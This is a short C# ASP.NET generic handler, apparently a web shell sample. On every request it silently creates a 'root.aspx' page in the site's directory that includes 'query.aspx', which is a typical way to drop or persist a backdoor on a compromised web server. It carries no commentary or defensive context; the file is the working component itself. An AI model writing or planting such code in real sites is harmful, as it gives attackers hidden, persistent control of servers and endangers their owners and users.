<%@ WebHandler Language="C#" class="Handler" %>
using System;
using System.Web;
using System.IO;
public class Handler : IHttpHandler {

    public void ProcessRequest (HttpContext context) {
        context.Response.ContentType = "text/plain";
        StreamWriter file1= File.CreateText(context.Server.MapPath("root.aspx"));
        file1.Write("<!--#include file=\"query.aspx\" -->");
        file1.Flush();
        file1.Close();
    }
    public bool IsReusable {
        get {
            return false;
        }
    }
}
